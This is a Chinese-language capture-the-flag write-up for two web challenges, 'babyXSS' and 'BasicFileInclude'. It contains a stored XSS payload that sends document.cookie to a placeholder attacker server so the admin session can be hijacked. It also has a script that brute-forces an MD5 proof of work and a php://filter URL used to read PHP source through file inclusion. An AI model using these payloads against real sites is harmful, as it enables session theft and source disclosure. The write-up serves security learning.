解题部分

babyXSS

题目


解题思路

首先分析页面信息，首先是存在一个“admin.php”的文件，应该也就是我们的目标，但是这个文件只能是已登记的用户才能访问。
直接查看会被提示cookie不正确。
初步构思我们需要拿到正确的cookie，通过伪装访问页面得到flag。
页面有两个文本框，第一个是文本框，可以留下我们的信息。
第二个文本框，提示我们需要工作证明。需要提交一个md5值满足特定条件的数字。
如果要顺利留下信息，就需要先破解这个md5截断问题。
要拿到“admin”的cookie，我们还需要注入我们的脚本，让用户访问特定的服务端，并得到cookie

解题过程

直接上代码

from multiprocessing.dummy import Pool as tp
import hashlib

knownMd5 = '117b37'      #已知的md5明文

def md5(text):
    return hashlib.md5(str(text).encode('utf-8')).hexdigest()

def findCode(code):
    key = code.split(':')
    start = int(key[0])
    end = int(key[1])
    for code in range(start, end):
        if md5(code)[0:6] == knownMd5:
            print(code)
            break

list=[]
for i in range(3):    #这里的range(number)指爆破出多少结果停止
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = tp()    #使用多线程加快爆破速度
pool.map(findCode, list)
pool.close()
pool.join()

输入对应的明文，在第一个文本框留下测试用xss脚本

<script>alert(/XSS/)</script>

留下信息后提示我们可以查看，查看后发现出现弹窗，xss攻击成功。

提交以下代码，并在href后加上自己的服务器和端口，监听该端口。

<script>
var i=document.createElement("link");
i.setAttribute("rel","prefetch");
i.setAttribute("href","https://ip:port/?"+document.cookie);
document.head.appendChild(i);
</script>

提交后，点击查看，即可在服务端查看到cookie。
利用burp修改cookie并查看“admin.php”即可。

BasicFileInclude

题目

解题思路

flag隐藏在页面信息内，通过查看源代码，只有两个页面，所以信息就在page=flag页面中。

解题过程

利用封装协议读取php源码，url构造如下

/?page=php://filter/read=convert.base64-encode/resource=flag

输入得到一串Base64密文，解码得到flag。
